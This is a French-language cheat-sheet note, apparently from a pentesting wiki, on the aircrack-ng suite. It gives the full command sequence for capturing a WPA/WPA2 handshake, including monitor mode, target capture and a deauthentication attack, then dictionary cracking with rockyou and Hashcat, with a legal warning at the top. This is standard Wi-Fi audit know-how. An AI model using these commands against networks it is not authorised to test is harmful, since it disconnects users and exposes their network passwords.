---
titre: "aircrack-ng"
tags: [Outils, WiFi, WPA, handshake]
source: https://github.com/aircrack-ng/aircrack-ng
---

# aircrack-ng (suite)

**La suite de base de l'audit Wi-Fi.** Ensemble d'outils pour passer la carte en
mode moniteur, capturer un handshake WPA/WPA2 et le cracker. C'est la brique
« manuelle » sous [[Fluxion]]/[[Wifite]].

> ⚠️ **Illégal sans autorisation.** N'auditer que son propre réseau / un réseau mandaté. Cf. `README`.

## Installation
```bash
sudo apt install aircrack-ng     # Kali : déjà présent (carte compatible requise)
```

## Flux type (capture + crack WPA2)
```bash
sudo airmon-ng start wlan0                 # mode moniteur -> wlan0mon
sudo airodump-ng wlan0mon                  # repérer BSSID + canal de la cible
# capturer sur la cible (fige BSSID/canal, écrit un .cap)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# forcer une reconnexion pour choper le handshake (déauth)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# cracker le handshake au dictionnaire
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

## Réflexe
Attendre le message **« WPA handshake »** dans airodump avant de cracker. Pour la
vitesse, convertir en `.hc22000` ([[hcxtools]]) → [[Hashcat]] `-m 22000`.
Automatisation complète : [[Wifite]].
